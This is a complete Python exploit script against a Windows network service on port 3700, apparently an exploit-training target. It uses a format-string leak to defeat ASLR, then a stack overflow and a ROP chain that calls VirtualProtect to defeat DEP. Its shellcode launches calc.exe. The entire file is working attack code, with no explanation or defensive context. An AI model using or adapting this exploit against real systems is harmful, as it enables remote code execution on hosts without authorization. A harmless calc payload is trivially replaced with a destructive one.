import socket
import struct
import sys

target = sys.argv[1]
port = 3700

def insert_db(f):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 902

    buf = struct.pack("<L",opcode)
    if f == 1:
        buf += b"B"*600
    else:
        buf += b"%x:"*300
    s.send(buf)

    res = s.recv(1024)
    
    s.close()    
    return ord(res.decode()[0])

def delete_db(i):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 924

    buf = struct.pack("<L",opcode)
    buf += struct.pack("<L",i)
    s.send(buf)

    res = s.recv(1024)
    print(res)
    s.close()

def unknown_db(i,eip):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 914

    buf = struct.pack("<L",opcode)
    buf += struct.pack("<L",i)
    buf += b"D"*2056 + struct.pack("<L",eip)
    s.send(buf)

    res = s.recv(1024)
    print(res)
    s.close()

def update_db(i):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 903

    buf = struct.pack("<L",opcode)
    buf += struct.pack("<L",i)
    buf += b"B"*1000
    s.sendall(buf)
    print(s.recv(1024))
    s.close()
   
def get_quote(i):
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 901

    buf = struct.pack("<L",opcode)
    buf += struct.pack("<L",i)
    buf += b"B"*10
    s.send(buf)
    r = s.recv(1024)
    s.close()

    return r

def control_eip(p):
    i = insert_db(1)
    unknown_db(i,p)

def leak_stack():
    i = insert_db(0)
    return get_quote(i)

def exploit(b):
    
    shellcode = b"A"*500
    
    shellcode =  b"\x90"*207
    shellcode += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0"
    shellcode += b"\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b"
    shellcode += b"\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61"
    shellcode += b"\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2"
    shellcode += b"\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11"
    shellcode += b"\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3"
    shellcode += b"\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6"
    shellcode += b"\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75"
    shellcode += b"\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
    shellcode += b"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c"
    shellcode += b"\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
    shellcode += b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
    shellcode += b"\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00"
    shellcode += b"\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
    shellcode += b"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5"
    shellcode += b"\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47"
    shellcode += b"\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c"
    shellcode += b"\x63\x2e\x65\x78\x65\x00"
    shellcode += b"\x90"*100

    i = insert_db(1)
    va = struct.pack("<L",b+0x4321C)            # Address of VirtualProtect
    va += struct.pack("<L",0x41414141)          # Return address i.e shellcode
    va += struct.pack("<L",0x42424242)          # shellcode address
    va += struct.pack("<L",0x500)               # dwSize
    va += struct.pack("<L",0x40)                # flProtect
    va += struct.pack("<L",b+0x3ff00)           # flOldProtect address

    eip = struct.pack("<L",b+0x2b37)           # pop eax; pop ecx; ret

    rop = struct.pack("<L",0x0)                 # dummy
    rop += struct.pack("<L",0x0)                # dummy
    rop += struct.pack("<L",b+0x1e69)           # or eax, esp; ret
    
    rop += struct.pack("<L",b+0x2b38)           # pop ecx; ret
    rop += struct.pack("<L",0xffffffd8)         # -0x28
    rop += struct.pack("<L",b+0x9b36)           # add eax, ecx; pop ebx; ret
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",b+0x1e73)           # mov ebx, eax; ret

    rop += struct.pack("<L",b+0x2b37)           # pop eax; pop ecx; ret
    rop += struct.pack("<L",b+0x4321C)          # dummy
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",b+0x1e6c)           # mov eax, [eax]; add ecx, 0x5; pop edx; ret
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",b+0x1e7a)           # mov [ebx], eax; ret
    
    rop += struct.pack("<L",b+0x1e82)           # add ebx, 0x04; ret
    rop += struct.pack("<L",b+0x2b37)           # pop eax; pop ecx; ret
    rop += struct.pack("<L",0xfffffdf6)         # offset to shellcode
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",b+0x1e7b)           # add eax, ebx; xchg edx, ebx; cmp ebx, eax; ret
    rop += struct.pack("<L",b+0x1e7d)           # xchg edx, ebx; cmp ebx, eax; ret
    rop += struct.pack("<L",b+0x1e7a)           # mov [ebx], eax; ret

    rop += struct.pack("<L",b+0x1e82)           # add ebx, 0x04; ret
    rop += struct.pack("<L",b+0x1e7a)           # mov [ebx], eax; ret

    rop += struct.pack("<L",b+0x5306)           # mov eax, ebx; pop ebx; pop esi; ret
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",0x41414141)         # dummy
    rop += struct.pack("<L",b+0x594f)           # pop ebx; ret
    rop += struct.pack("<L",0xfffffff8)         # offset to add to eax to point to start of va
    rop += struct.pack("<L",b+0x1e7b)           # add eax, ebx; xchg edx, ebx; cmp ebx, eax; ret

    rop += struct.pack("<L",b+0x344d)           # xchg eax, esp; ret

    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target,port))

    opcode = 914

    buf = struct.pack("<L",opcode)
    buf += struct.pack("<L",i)
    buf += b"D"*(2056-len(va)-20-len(shellcode)) + b"\x90"*10 + shellcode + b"\x90"*10 + va + eip + rop
    s.send(buf)

    res = s.recv(1024)
    print(res)
    s.close()

res = leak_stack()
t = res.decode().split(":")[4]

baddr = int("0x"+t,16)-0x18fb

print(f"[!] Base address of server: {hex(baddr)}")
input(".........EXPLOITING........")
exploit(baddr)
